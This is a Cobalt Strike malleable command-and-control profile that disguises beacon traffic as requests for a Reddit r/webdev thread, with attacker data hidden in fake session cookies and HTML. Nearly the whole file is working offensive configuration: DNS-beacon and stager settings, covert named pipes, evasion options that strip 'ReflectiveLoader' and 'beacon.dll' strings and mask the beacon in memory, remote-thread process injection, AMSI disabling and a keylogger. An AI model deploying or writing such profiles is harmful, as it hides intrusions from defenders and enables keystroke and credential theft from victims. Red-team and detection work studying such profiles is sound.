#reddit profile
#from /r/webdev and random comment
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36";
set data_jitter "50";

dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

###SMB options###
set pipename "ntsvcs##";
set pipename_stager "scerpc##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH options###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

#custom cert
#https-certificate {
#    set keystore "your_store_file.store";
#    set password "your_store_pass";
#}

http-config {
#    set headers "Server, Content-Type, Cache-Control, Connection";
#    header "Connection" "close";
#    header "Cache-Control" "max-age=2";
#    header "Server" "nginx";
    #set "true" if teamserver is behind redirector
    set trust_x_forwarded_for "false";
    
    set block_useragents "curl*,lynx*,wget*";
}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

http-get {

    set uri "/r/webdev/comments/95ltyr";
    
    client {

        header "Host" "www.reddit.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";
	header "Connection" "close";
	
        
        metadata {
            base64url;
	    prepend "session_tracker=";
	    prepend "0001eqt60.2.1;";
	    prepend "loid=";
	    append ";rseor3=";
	    append "true";
	    append ";reddaid=";
	    append "SHXIJU204B";
	    	    
	    header "Cookie";

        }

    }

    server {

	header "Cache-control" "private, s-maxage=0, max-age=0, must-revalidate";
	header "Content-Type" "text/html; charset=utf-8";
        
        output {

            base64url;
	    prepend "<!DOCTYPE html><html lang=\"en\"><head><title>Has anyone else noticed slow loading of Google fonts across the board? : webdev</title><meta charSet=\"utf8\"/><meta name=\"viewport\" content=";
	    append "</script><script defer=\"\" type=\"text/javascript\" src=\"https://www.redditstatic.com/desktop2x/runtime.24e5d569e89bb0cc0439.js\"></script><script defer=\"\" type=\"text/javascript\" src=\"https://www.redditstatic.com/desktop2x/vendors~Profile~ProfileHomepage~ProfilePostComments~R2CommentsPage~R2Listing~Reddit.ab6e733968a19bb51c3a.js\"></script><script defer=\"\" type=\"text/javascript\"";

            print;
        }
    }
}

http-post {
    
    set uri "/r/webdev/comments/95lyr/slow_loading_of_google";
    set verb "GET";

    client {

	header "Host" "www.reddit.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";     
        
        output {
            base64url;
	    
	    prepend "session_tracker=";
	    prepend "0001eqt60.2.1;";
	    prepend "loid=";
	    append ";rseor3=";
	    append "true";
	    append ";reddaid=";
	    append "SHXIJU204B";
	    
	    
	    header "Cookie";


        }


        id {
	    base64url;
	    parameter "id";

        }
    }

    server {

	header "Cache-control" "private, s-maxage=0, max-age=0, must-revalidate";
	header "Content-Type" "text/html; charset=utf-8";
        

        output {
            base64url;
	    prepend "<!DOCTYPE html><html lang=\"en\"><head><title>Has anyone else noticed slow loading of Google fonts across the board? : webdev</title><meta charSet=\"utf8\"/><meta name=\"viewport\" content=";
	    append "</script><script defer=\"\" type=\"text/javascript\" src=\"https://www.redditstatic.com/desktop2x/runtime.24e5d569e89bb0cc0439.js\"></script><script defer=\"\" type=\"text/javascript\" src=\"https://www.redditstatic.com/desktop2x/vendors~Profile~ProfileHomepage~ProfilePostComments~R2CommentsPage~R2Listing~Reddit.ab6e733968a19bb51c3a.js\"></script><script defer=\"\" type=\"text/javascript\"";
	   
            print;
        }
    }
}

http-stager {

    set uri_x86 "/r/Webdev";
    set uri_x64 "/r/WebDev";

    client {
	header "Host" "www.reddit.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";
	header "Connection" "close";
    }

    server {
	header "Cache-control" "private, s-maxage=0, max-age=0, must-revalidate";
	header "Content-Type" "text/html; charset=utf-8";
    
    }


}

###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "17 Oct 2020 04:32:14";
    set entry_point     "170001";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "";
    
    set sleep_mask "true";
    
    set smartinject "true";
    
    #allocator options include HeapAlloc, MapViewOfFile, VirtualAlloc, or you can use module stomp.
    #set allocator "HeapAlloc";
    set magic_mz_x86 "MZRE";
    set magic_mz_x64 "MZAR";
    set magic_pe "EA";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #string "something";
    #data "something";
    #stringw "something"; 
}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        #prepend "\x90\x90\x90";
    }
    transform-x64 {
        #prepend "\x90\x90\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
    set keylogger "SetWindowsHookEx";


}
